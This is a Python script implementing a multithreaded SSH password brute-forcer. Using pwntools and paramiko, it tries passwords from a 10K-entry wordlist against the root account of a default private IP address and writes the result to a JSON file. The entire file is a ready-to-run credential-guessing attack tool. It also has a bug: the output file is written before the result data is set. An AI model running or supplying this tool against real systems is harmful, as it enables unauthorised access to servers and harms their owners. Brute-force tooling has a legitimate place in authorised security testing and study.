import datetime
import json
from pwn import *
import paramiko
import threading

class SSHBruteForce:
    """
    This class provides methods for performing a brute-force attack on an SSH server using the pwn and paramiko libraries.

    Attributes:
    - host: The target SSH server IP address.
    - username: The SSH username for the brute-force attack.
    - passwordFile: Path to the file containing passwords.
    - attempts: Number of password attempts made.
    - success_event: Event to signal successful password discovery.

    Methods:
    1. __init__(self, host="192.168.146.65", username="root", passwordFile="./extra/10K_password.txt"):
        - Initializes the instance with the specified or default values.

    2. connectionAttempt(self, password):
        - Attempts an SSH connection using the provided password.
        - Returns True if the connection is successful, False otherwise.

    3. run(self):
        - Creates multiple threads to perform parallel password attempts.
        - Stops creating new threads if a successful password is found.

    Script Execution (if __name__ == '__main__'):
        - Creates an instance of SSSHBruteForce and starts the brute-force attack.
    """

    def __init__(self, host = "192.168.146.65", username = "root", port = 22, threads = 5, passwordFile = "./extra/10K_password.txt"):
        self.host = host
        self.username = username
        self.port = port # cirrently disabled
        self.thread_count = threads # recommended to use 5 threads, more threads will cause result success to be skipped somehow
        self.passwordFile = passwordFile
        self.attempts = 0        
        self.success_event = threading.Event()
        self.host_ssh_status = "up"
        self.password = None
        self.result_json = None
    
    def connectionAttempt(self, password):
        try:
            print("[{}] Attempting password: '{}'!".format(self.attempts, password))
            # Attempt SSH connection using the current password
            
            # response = ssh(host=self.host, user=self.username, port=self.port, password=password, timeout=2)
            response = ssh(host=self.host, user=self.username, password=password, timeout=2)
            
            if response.connected():
                # If the connection is successful, print the valid password and break the loop
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                self.password = password
                self.success_event.set()  # Set the event to signal success
                return True

            response.close()
            
        except paramiko.ssh_exception.NoValidConnectionsError:
            print("Invalid password!")
            return False
        except paramiko.ssh_exception.SSHException:
            print("Invalid password!")
            return False
        except paramiko.ssh_exception.AuthenticationException:
            # If authentication fails, print "Invalid password!"
            print("Invalid password!")
            return False
        except paramiko.ssh_exception.socket.error:
            # If the host is down, break the loop
            print("Host is down!")
            self.host_ssh_status = "down"
            self.success_event.set()  # Set the event to signal failure
            return False
    
    def run(self):
        threads = []

        with open(self.passwordFile, "r") as passwords_list:
            for password in passwords_list:
                if self.success_event.is_set():
                    break  # Stop creating new threads if a successful password is found

                password = password.strip("\n")

                t = threading.Thread(target=self.connectionAttempt, args=(password,))
                threads.append(t)
                t.start()

                if len(threads) >= self.thread_count:
                    # Wait for the first 5 threads to finish before starting new ones
                    for thread in threads:
                        thread.join()
                    threads = []

                self.attempts += 1

        # Wait for any remaining threads to finish
        for thread in threads:
            thread.join()

        self.write_output_to_file()
        self.result_json = {
            "host": self.host,
            "username": self.username,
            "password": self.password,
            "attempts": self.attempts,
            "host_ssh_status": self.host_ssh_status
        }
        return self.result_json

    def write_output_to_file(self):
        current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        file_name = f"./results/sshBruteforce_results{current_time}.json"
        with open(file_name, "w") as file:
            json.dump(self.result_json, file, indent=4)
        print(f"Output written to file: {file_name}")

if __name__ == "__main__":
    SSHBruteForce().run()